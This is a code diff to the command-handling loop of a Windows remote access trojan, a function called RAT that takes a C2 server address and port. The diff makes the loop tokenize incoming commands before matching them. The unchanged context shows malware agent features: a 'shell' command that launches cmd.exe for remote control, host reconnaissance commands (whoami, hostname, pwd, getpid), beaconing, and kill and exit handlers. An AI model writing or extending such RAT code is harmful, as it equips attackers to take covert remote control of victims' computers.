@@ -131,8 +131,12 @@ void RAT(char* C2_Server, int C2_Port)
                     exit(0);
                 }
 
+                char * command;
+                char delim[] = " ";
+                command = strtok(CommandReceived, delim);
+
                 // Should only be used in individual interactive environments == TBC
-                if ((strcmp(CommandReceived, "shell") == 0))
+                if ((strcmp(command, "shell") == 0))
                 {
                     char Process[] = "cmd.exe";
                     STARTUPINFO sinfo;
@@ -161,7 +165,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
-                else if ((strcmp(CommandReceived, "whoami") == 0))
+                else if ((strcmp(command, "whoami") == 0))
                 {
                     char buffer[257] = "";
                     whoami(buffer, 257);
@@ -171,7 +175,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
-                else if ((strcmp(CommandReceived, "hostname") == 0))
+                else if ((strcmp(command, "hostname") == 0))
                 {
                     char buffer[257] = "";
                     hostname(buffer, 257);
@@ -181,7 +185,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
-                else if ((strcmp(CommandReceived, "pwd") == 0))
+                else if ((strcmp(command, "pwd") == 0))
                 {
                     char buffer[257] = "";
                     pwd(buffer, 257);
@@ -191,7 +195,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
-                else if ((strcmp(CommandReceived, "getpid") == 0))
+                else if ((strcmp(command, "getpid") == 0))
                 {   
                     DWORD pid;
                     char char_pid[6];
@@ -209,7 +213,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
-                else if (strcmp(CommandReceived, "ping") == 0)
+                else if (strcmp(command, "ping") == 0)
                 {
                     char buffer[64] = "";
                     strcat(buffer,"[*Agent-msg] PONG\n");
@@ -218,7 +222,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
 			    }
-                else if (strcmp(CommandReceived, "beacon") == 0)
+                else if (strcmp(command, "beacon") == 0)
                 {
                     char buffer[128] = "";
                     strcat(buffer,"d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy");
@@ -227,7 +231,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
 			    }
-                else if (strcmp(CommandReceived, "exit") == 0)
+                else if (strcmp(command, "exit") == 0)
                 {
                     closesocket(tcp_sock);
                     WSACleanup();
@@ -236,7 +240,7 @@ void RAT(char* C2_Server, int C2_Port)
                     std::cout << "Sleep End... Returning" << std::endl;
                     break;
                 }
-                else if (strcmp(CommandReceived, "kill") == 0) 
+                else if (strcmp(command, "kill") == 0) 
                 {
                     closesocket(tcp_sock);
                     WSACleanup();
